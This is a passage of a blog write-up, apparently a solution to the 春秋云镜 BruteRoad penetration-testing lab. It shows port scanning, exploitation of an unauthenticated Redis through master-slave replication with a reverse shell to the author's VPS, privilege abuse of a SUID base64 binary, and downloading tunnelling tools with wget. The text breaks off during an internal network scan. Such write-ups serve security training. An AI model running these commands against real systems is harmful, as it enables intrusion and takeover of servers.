@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="考点 redis主从复制rce base64命令提权 sweetpotato提权 约束性委派  flag1依旧扫端口 123456789101112131415161718192021root@VM-16-12-ubuntu:&#x2F;opt# .&#x2F;fscan -h 39.99.134.81 -p 1-65535   ___                              _      &#x2F; _">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜BruteRoad">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="考点 redis主从复制rce base64命令提权 sweetpotato提权 约束性委派  flag1依旧扫端口 123456789101112131415161718192021root@VM-16-12-ubuntu:&#x2F;opt# .&#x2F;fscan -h 39.99.134.81 -p 1-65535   ___                              _      &#x2F; _">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106102315208.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106103721950.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104349497.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104608050.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104646979.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104753820.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106105453689.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106105637935.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110127135.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110546282.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110728079.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110859853.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111158674.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111656163.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111820721.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106111925866.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106112004833.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106112412806.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106115250786.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106115446178.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106115620216.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106120039063.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106120253686.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106120746197.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106122646317.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106123330607.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106123451948.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106124218455.png">
+<meta property="article:published_time" content="2025-11-06T02:22:16.000Z">
+<meta property="article:modified_time" content="2025-11-06T04:42:21.744Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="BruteRoad">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106102315208.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云镜BruteRoad</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&text=春秋云镜BruteRoad"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&is_video=false&description=春秋云镜BruteRoad"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜BruteRoad&body=Check out this article: https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&title=春秋云镜BruteRoad"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&name=春秋云镜BruteRoad&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBruteRoad/&t=春秋云镜BruteRoad"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-number">2.1.</span> <span class="toc-text">redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress%E6%8F%92%E4%BB%B6nday"><span class="toc-number">4.1.</span> <span class="toc-text">WordPress插件nday</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">5.</span> <span class="toc-text">flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4mssql%E5%AF%86%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">弱口令爆破mssql密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9C%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">甜土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7%E5%B9%B6RDP"><span class="toc-number">5.3.</span> <span class="toc-text">添加新用户并RDP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">6.</span> <span class="toc-text">flag4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">6.1.</span> <span class="toc-text">约束委派攻击</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云镜BruteRoad
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-06T02:22:16.000Z" class="dt-published" itemprop="datePublished">2025-11-06</time>
+        
+        (Updated: <time datetime="2025-11-06T04:42:21.744Z" class="dt-updated" itemprop="dateModified">2025-11-06</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/BruteRoad/" rel="tag">BruteRoad</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106102315208.png" alt="image-20251106102315208"></p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>redis主从复制rce</li>
+<li>base64命令提权</li>
+<li>sweetpotato提权</li>
+<li>约束性委派</li>
+</ul>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>依旧扫端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/opt# ./fscan -h 39.99.134.81 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">39.99.134.81:21 open</span></span><br><span class="line"><span class="string">39.99.134.81:22 open</span></span><br><span class="line"><span class="string">39.99.134.81:80 open</span></span><br><span class="line"><span class="string">39.99.134.81:6379 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 4</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.99.134.81       code:200 len:4833   title:Welcome to CentOS</span></span><br><span class="line"><span class="string">[+] ftp 39.99.134.81:21:anonymous </span></span><br><span class="line"><span class="string">   [-&gt;]pub</span></span><br><span class="line"><span class="string">[+] Redis 39.99.134.81:6379 unauthorized file:/usr/local/redis/db/dump.rdb</span></span><br><span class="line"><span class="string">已完成 4/4</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 41.647936648s</span></span><br></pre></td></tr></table></figure>
+
+<p>发现开启了一个21和6379</p>
+<p>anonymous表示该FTP服务允许匿名登录，并且还扫出来一个pub目录，尝试登录一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# lftp -u anonymous ftp://39.99.134.81</span><br><span class="line">密码: </span><br><span class="line">lftp anonymous@39.99.134.81:~&gt; <span class="built_in">ls</span>                  </span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jun 09  2021 pub</span><br><span class="line">lftp anonymous@39.99.134.81:/&gt; <span class="built_in">set</span> ftp:charset GBK</span><br><span class="line">lftp anonymous@39.99.134.81:/&gt; <span class="built_in">ls</span></span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jun 09  2021 pub</span><br><span class="line">lftp anonymous@39.99.134.81:/&gt; <span class="built_in">ls</span> pub</span><br><span class="line">lftp anonymous@39.99.134.81:/&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>发现是空的，那看看redis</p>
+<h3 id="redis主从复制RCE"><a href="#redis主从复制RCE" class="headerlink" title="redis主从复制RCE"></a>redis主从复制RCE</h3><p>unauthorized表示 <strong>Redis 实例允许未认证访问</strong>，访问一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 39.99.134.81</span><br><span class="line">info</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106103721950.png" alt="image-20251106103721950"></p>
+<p>版本是5.0.12，可以打redis主从复制RCE <a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>但是特别容易打崩，并且记得把服务器的21000端口打开</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104349497.png" alt="image-20251106104349497"></p>
+<p>rhost是题目地址，lhost是自己vps的地址，执行成功后会问你想要正向shell还是方向shell，然后你选r就是反弹shell，然后后面输入你想弹的地址与端口即可</p>
+<p>在vps上运行脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 39.99.134.81 --lhost [vpsip]</span><br><span class="line">r</span><br><span class="line">[lhost]</span><br><span class="line">9999</span><br><span class="line"></span><br><span class="line">vps上监听9999端口</span><br><span class="line">nc -lvnp 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104608050.png" alt="image-20251106104608050"></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104646979.png" alt="image-20251106104646979"></p>
+<p>sh不太方便，做个交互式bash</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106104753820.png" alt="image-20251106104753820"></p>
+<p>然后需要提权，SUDO提权不行，看看suid位文件提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>SUID 位文件</th>
+<th>sudo -l  命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>作用</td>
+<td>允许用户以文件所有者的权限执行程序</td>
+<td>查看当前用户能通过 sudo  执行的命令</td>
+</tr>
+<tr>
+<td>权限提升方式</td>
+<td>运行 SUID 程序时临时获得所有者权限</td>
+<td>通过 sudo  显式提权执行命令</td>
+</tr>
+<tr>
+<td>持久性</td>
+<td>只要文件 SUID 位存在，每次执行都生效</td>
+<td>需每次手动输入 sudo</td>
+</tr>
+</tbody></table>
+<p>查看SUDO命令之后退出发现又得重新打redis了，并且需要重置靶机</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106105453689.png" alt="image-20251106105453689"></p>
+<p>看到一个base64，base64可以提权读文件<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/base64/">https://gtfobins.github.io/gtfobins/base64/</a></p>
+<p>先find找一下flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106105637935.png" alt="image-20251106105637935"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[redis@centos-web01 /]$ <span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"><span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"> ██████                    ██              ██  ███████                           ██</span><br><span class="line">░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██</span><br><span class="line">░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██</span><br><span class="line">░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████</span><br><span class="line">░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██</span><br><span class="line">░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██</span><br><span class="line">░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████</span><br><span class="line">░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░���░░░   ░░░░░░░░  ░░░░░░ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag01: flag&#123;fbfba5b8-cda6-454b-8f78-a22ec312e96d&#125;</span><br><span class="line"></span><br><span class="line">Congratulations! ! !</span><br><span class="line">Guess <span class="built_in">where</span> is the second flag?</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>可以把stowaway和fscan放在自己的vps网页根目录，然后wget去下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">wget http://vps/fscan</span><br><span class="line">wget http://vps/linux_x64_agent</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x *</span><br></pre></td></tr></table></figure>
+
+<p>先看一下ip地址，常规的ifconfig命令没用，可以使用netstat -ano或者hostname -i来查看</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251106110127135.png" alt="image-20251106110127135"></p>
+<p>内网ip是172.22.2.7，fscan扫一下内网ip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.0/24</span><br><span class="line">./fscan -h 172.22.2.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.2.34     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.2.7      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.2.3      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.2.18     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.2.16     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 5</span></span><br><span class="line"><span class="string">172.22.2.7:80 open</span></span><br><span 